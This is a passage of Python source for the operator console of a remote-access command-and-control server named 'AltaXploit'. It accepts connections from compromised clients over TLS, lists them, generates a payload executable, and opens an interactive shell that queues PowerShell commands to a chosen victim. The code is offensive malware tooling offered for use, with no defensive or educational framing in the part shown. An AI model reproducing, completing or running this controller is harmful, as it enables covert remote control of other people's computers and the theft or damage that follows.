    print(f"{BOLD_GREEN}[*] RTMP Server IP: {LHOST}{RESET}")
    print(f"{BOLD_YELLOW}[*] Type 'help' for commands{RESET}")
    print(f"{BOLD_YELLOW}[*] Type 'generate payload' to create a new EXE{RESET}")
    print()

    threading.Thread(target=accept_clients, args=(bindsocket, context), daemon=True).start()
    print_prompt()

    while True:
        try:
            cmd = input()
        except KeyboardInterrupt:
            graceful_shutdown()
        except EOFError:
            cmd = 'exit'

        if not cmd.strip():
            print_prompt()
            continue

        if cmd.lower() == 'help':
            show_help()
            print_prompt()
        elif cmd.lower() in ('exit', 'quit'):
            graceful_shutdown("[*] Shutting down...")
        elif cmd.lower() == 'list':
            print_client_list()
            print_prompt()
        elif cmd.lower() == 'clear':
            os.system('clear' if os.name == 'posix' else 'cls')
            print_prompt()
        elif cmd.lower().startswith('generate payload'):
            generate_payload()
            print_prompt()
        elif cmd.lower().startswith('kill '):
            try:
                target_id = int(cmd.split()[1])
                with clients_lock:
                    client = clients.get(target_id)
                    if client and client.alive:
                        # Send the kill command to the client
                        client.cmd_queue.put('Stop-Process -Name powershell -Force')
                        # Wait a moment for the command to be sent
                        time.sleep(1)
                        # Close the connection
                        try:
                            client.connstream.close()
                        except:
                            pass
                        client.alive = False
                        # Remove from dict
                        if target_id in clients:
                            del clients[target_id]
                        print(f"{BOLD_GREEN}[+] Client {target_id} permanently killed.{RESET}")
                    else:
                        print(f"{BOLD_YELLOW}[!] Client {target_id} not found or already dead.{RESET}")
            except (IndexError, ValueError):
                print(f"{BOLD_YELLOW}[!] Usage: kill <id>{RESET}")
            print_prompt()
        elif cmd.startswith('attack '):
            try:
                target_id = int(cmd.split()[1])
                client = clients.get(target_id)
                if not client or not client.alive:
                    print(f"{BOLD_YELLOW}[!] Invalid client ID{RESET}")
                    print_prompt()
                    continue

                in_interactive = True
                print(f"{BOLD_GREEN}[*] Interactive shell with AltaXploit[{target_id}]. Type 'back' to return.{RESET}")
                print(f"{LIGHT_RED}AltaXploit[{target_id}]{RESET}> ", end='', flush=True)
                while client.alive:
                    try:
                        subcmd = input().strip()
                    except KeyboardInterrupt:
                        graceful_shutdown()

                    if not subcmd:
                        print(f"{LIGHT_RED}AltaXploit[{target_id}]{RESET}> ", end='', flush=True)
                        continue
                    if subcmd.lower() == 'back':
                        print(f"{BOLD_YELLOW}[*] Returning to main prompt.{RESET}")
                        break
                    if subcmd.lower() in ('exit', 'quit'):
                        graceful_shutdown("[*] Shutting down...")
                    client.cmd_queue.put(subcmd)
                in_interactive = False
                flush_pending_messages()
                print_prompt()
            except ValueError:
                print(f"{BOLD_YELLOW}[!] Invalid client ID{RESET}")
                print_prompt()
        else:
            print(f"{BOLD_YELLOW}[-] Unknown command. Type 'help'.{RESET}")
            print_prompt()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        graceful_shutdown()
